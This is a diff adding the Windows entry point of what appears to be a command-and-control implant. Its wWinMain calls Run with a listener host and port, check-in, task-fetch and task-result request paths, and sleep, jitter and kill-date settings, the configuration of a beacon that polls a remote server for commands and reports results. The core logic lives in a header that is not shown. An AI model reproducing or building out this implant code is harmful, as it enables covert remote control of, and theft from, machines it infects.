@@ -1,0 +1,19 @@
+#include "hermit.hpp"
+
+INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, INT nCmdShow)
+{
+	Run(
+		hInstance,
+		nCmdShow,
+		LISTENER_HOST_W,
+		(INTERNET_PORT)LISTENER_PORT,
+		REQUEST_PATH_CHECKIN_W,
+        REQUEST_PATH_TASKGET_W,
+        REQUEST_PATH_TASKRESULT_W,
+		PAYLOAD_SLEEP,
+		PAYLOAD_JITTER,
+		PAYLOAD_KILLDATE
+	);
+
+	return EXIT_SUCCESS;
+}
